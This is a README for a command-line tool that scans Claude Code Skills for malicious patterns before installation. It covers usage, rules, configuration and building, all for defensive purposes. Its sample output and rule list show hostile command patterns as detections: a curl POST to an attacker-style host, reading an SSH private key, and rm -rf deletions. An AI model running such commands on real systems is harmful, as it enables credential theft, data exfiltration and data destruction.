# Skill-Security-Scanner

> 🔍 Security Scanning Tool for Claude Skills - Protect Your Development Environment

[![Python](https://img.shields.io/badge/Python-3.9+-blue.svg)](https://www.python.org/)
[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Version](https://img.shields.io/badge/Version-1.0.0-orange.svg)](https://github.com/huifer/skill-security-scan)

---

## 📖 Overview

**skill-security-scan** is a command-line tool designed to scan and detect security risks in Claude Skills. Before installing third-party Skills, use this tool for security review to effectively prevent malicious code from stealing data or compromising your system.

This project is initiated and maintained by developers from [WellAlly Technology](https://www.wellally.tech/), dedicated to providing secure and reliable tools for the developer community.

### ⚠️ Why Do You Need skill-security-scan?

When using Skills in local Claude Code, the following security risks exist:

1. **Complete File System Access** - Skills can read arbitrary files, including SSH keys, API keys, etc.
2. **Network Access Capabilities** - Skills can send data to external servers
3. **Script Execution Privileges** - Skills can execute arbitrary system commands
4. **Dependency Tampering** - Skills may modify global dependencies, breaking other projects

---

## ✨ Features

- 🔍 **Comprehensive Security Detection** - Multi-dimensional detection including network, file, command, code injection
- 🎯 **Intelligent Risk Scoring** - Automatically calculates risk scores and levels
- 🎨 **Multiple Output Formats** - HTML reports (default), colorful console, JSON reports
- 🌍 **Internationalization Support** - Supports Chinese and English interfaces
- 📁 **Smart Path Scanning** - Automatically scans `.claude/skills/` directory and current directory
- ⚙️ **Flexible Configuration** - Custom rules, whitelist management
- 🚀 **High Performance** - Fast scanning of large projects

---

## 🚀 Quick Start

### Installation

```bash
# Clone repository
git clone https://github.com/huifer/skill-security-scan
cd skill-security-scan

# Install package (editable mode)
pip install -e .

# Or install directly with pip
pip install skill-security-scan
```

### Basic Usage

```bash
# Scan current directory and .claude/skills/ (default behavior)
skill-security-scan scan

# Scan specified paths (still includes .claude/skills/)
skill-security-scan scan /path/to/skill

# Scan and generate HTML report with specified name
skill-security-scan scan --output my_report.html

# Generate JSON report
skill-security-scan scan --format json --output report.json

# Console output only (no HTML file)
skill-security-scan scan --format console

# Use custom rules
skill-security-scan scan --rules custom-rules.yaml

# Show only critical issues
skill-security-scan scan --severity CRITICAL

# Use English interface
skill-security-scan scan --lang en_US
```

---

## 📋 Command Options

```bash
skill-security-scan scan [OPTIONS] [PATHS]...

Options:
  -r, --recursive         Recursively scan subdirectories
  -o, --output FILE       Output report file (HTML defaults to auto-generated filename)
  -f, --format FORMAT     Report format [console|json|html] (default: html)
  --rules FILE            Custom rules file
  --severity LEVEL        Minimum display level [CRITICAL|WARNING|INFO] (default: INFO)
  --no-color              Disable color output
  --fail-on LEVEL         Exit with non-zero code on specified level
  --lang LANG             Interface language [zh_CN|en_US] (default: zh_CN)

Arguments:
  PATHS                   Paths to scan (optional, defaults to current directory and .claude/skills/)
```

**Notes**:
- When no paths specified, defaults to scanning current directory (`.`) and `.claude/skills/`
- When paths specified, `.claude/skills/` is still automatically scanned (if exists)
- HTML is the default format, auto-generates timestamped filename (e.g., `skill_scan_report_20231229_113252.html`)
- Console summary always displays regardless of output format

---

## 🎯 Detection Rules

### 🔴 CRITICAL (Severe)
- **NET001**: External network requests to non-official domains
- **FILE001**: Access to sensitive files (SSH keys, .env, etc.)
- **FILE002**: Dangerous file operations (rm -rf /, chmod 777)
- **CMD001**: Dangerous system command execution (sudo, dd)
- **INJ001**: Code injection patterns
- **INJ003**: Backdoor implantation

### 🟡 WARNING (Warning)
- **CMD002**: System command calls (os.system, subprocess)
- **INJ002**: Dynamic code execution (eval, exec)
- **DEP001**: Global package installation
- **DEP002**: Forced version override

### 🔵 INFO (Information)
- Code obfuscation patterns
- Hidden commands

---

## 📊 Output Examples

### HTML Report (Default)

Default generates beautiful HTML reports featuring:
- 📊 Visualized risk dashboard
- 🔍 Issue filtering by severity level
- 📈 Interactive charts and statistics
- 📱 Responsive design for mobile viewing
- 🌍 Automatic Chinese/English interface switching

HTML reports open in browsers for detailed review and analysis.

### Console Output

```
[*] Scanning Skills:
  - /path/to/skill
  - .claude\skills

[!] Risk Level: CRITICAL (10.0/10)

[!] CRITICAL Issues (67 found):
  [NET001] in SKILL.md:15
    Pattern: curl -X POST https://attacker-server.com/collect
    Confidence: High

  [FILE001] in scripts/setup.sh:8
    Pattern: cat ~/.ssh/id_rsa
    Confidence: High

  [CMD001] in SKILL.md:23
    Pattern: rm -rf /tmp/*
    Confidence: Medium

[*] WARNING Issues (61 found):
  [CMD002] in SKILL.md:46
    Pattern: os.system("unknown command")
    Confidence: Medium
  And 57 more

[*] Summary:
  Total Files Scanned: 7
  Critical Issues: 67
  Warning Issues: 61
  Info Issues: 0
  Total Issues: 128

[*] Recommendation: DO NOT USE - Critical security risks detected

Report saved to: skill_scan_report_20231229_113252.html
```

---

## ⚙️ Configuration

### Rule Configuration

Edit `config/rules.yaml` to customize detection rules:

```yaml
network_rules:
  - id: NET001
    name: "External Network Requests"
    severity: CRITICAL
    patterns:
      - "curl\\s+.*http"
      - "wget\\s+"
    description: "Detected data-sending network requests"
    allowed_domains:
      - "api.anthropic.com"
      - "github.com"
```

### Whitelist Management

```bash
# Add rule to whitelist
skill-security-scan whitelist add NET001

# View whitelist
skill-security-scan whitelist list

# Remove from whitelist
skill-security-scan whitelist remove NET001
```

---

## 🧪 Testing

```bash
# Run tests
pytest tests/

# Run tests with coverage
pytest tests/ --cov=src --cov-report=html
```

---

## 📦 Building Executable

The project can be packaged into a standalone executable using PyInstaller, which can run without installing Python environment.

### Building Steps

1. **Install PyInstaller**

```bash
pip install pyinstaller
```

2. **Run Build Command**

```bash
# Build using the spec file in the project
pyinstaller skill-security-scan.spec --clean
```

3. **Get Executable**

After building, the executable will be located at `dist/skill-security-scan.exe` (Windows) or `dist/skill-security-scan` (Linux/macOS).

The file size is approximately 10MB, containing all necessary dependencies and configuration files.

### Using Executable

```bash
# Run directly, no Python installation needed
./dist/skill-security-scan.exe --help

# Scan directories
./dist/skill-security-scan.exe scan /path/to/skill

# Generate reports
./dist/skill-security-scan.exe scan --output report.html
```

### Build Files Description

- **skill-security-scan.spec** - PyInstaller configuration file
  - Defines entry point as `standalone_cli.py`
  - Includes `config/*.yaml` configuration files
  - Includes entire `src/` directory
  - Sets UTF-8 encoding support to fix Windows Chinese display issues

- **standalone_cli.py** - Executable entry point
  - Handles path issues after PyInstaller packaging
  - Uses `runpy.run_module()` to execute CLI module
  - Automatically fixes Windows console encoding issues

- **dist/skill-security-scan.exe** - Final executable file
  - Runs independently without Python environment
  - Supports all CLI features
  - Can be copied to other machines for direct use

### Cross-Platform Building

```bash
# Windows
pyinstaller skill-security-scan.spec --clean

# Linux/macOS
pyinstaller skill-security-scan.spec --clean
```

Note: Executables should be built on the target operating system, or use corresponding virtual environments for building.

---

## 📁 Project Structure

```
skill-security-scan/
├── src/
│   ├── scanner/        # Scanning engine
│   ├── rules/          # Security rules
│   ├── reporters/      # Report generators (Console, JSON, HTML)
│   ├── i18n/           # Internationalization files (Chinese, English)
│   ├── config_loader.py # Configuration loader
│   ├── rules_factory.py # Rules factory
│   └── cli.py          # Command-line interface
├── config/             # Configuration files
│   ├── rules.yaml      # Security detection rules
│   └── whitelist.yaml  # Whitelist configuration
├── tests/              # Test cases
│   ├── skills/         # Test Skills
│   └── test_*.py       # Unit tests
├── examples/           # Example Skills
└── docs/               # Documentation
```

---

## 🔒 Security

- ✅ Static analysis only, does not execute Skill code
- ✅ Input path validation, prevents path traversal
- ✅ Resource usage limits (CPU, memory)
- ✅ Rule signature verification

---

## 🤝 Contributing

Contributions are welcome! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for details.

1. Fork this repository
2. Create feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to branch (`git push origin feature/AmazingFeature`)
5. Open Pull Request

---

## 📄 License

MIT License - See [LICENSE](LICENSE) file for details

---

## 🙏 Acknowledgments

- Thanks to all contributors
- Thanks to Anthropic for providing Claude Code platform

---

## 📮 Contact

- Issue Reporting: [GitHub Issues](https://github.com/huifer/skill-security-scan/issues)
- Email: huifer97@163.com
- Website: https://www.wellally.tech/

---

## 📚 Documentation

- [Technical Paper (English)](docs/articles/EN_SKILL_SECURITY_SCANNER_TECHNICAL_ARTICLE.md)
- [技术论文 (中文)](docs/articles/ZH_SKILL_SECURITY_SCANNER_TECHNICAL_ARTICLE.md)
- [Security Analysis (English)](docs/articles/EN_SKILLS_SECURITY_ANALYSIS.md)
- [安全分析 (中文)](docs/articles/ZH_SKILLS_SECURITY_ANALYSIS.md)
- [Workflow Diagrams](docs/WORKFLOW_DIAGRAMS.md)

---

**⚠️ Disclaimer**: This tool cannot guarantee 100% detection of all security risks. Always use third-party Skills with caution and test them in isolated environments.

---

**[中文文档](README.md)** | **English Documentation**
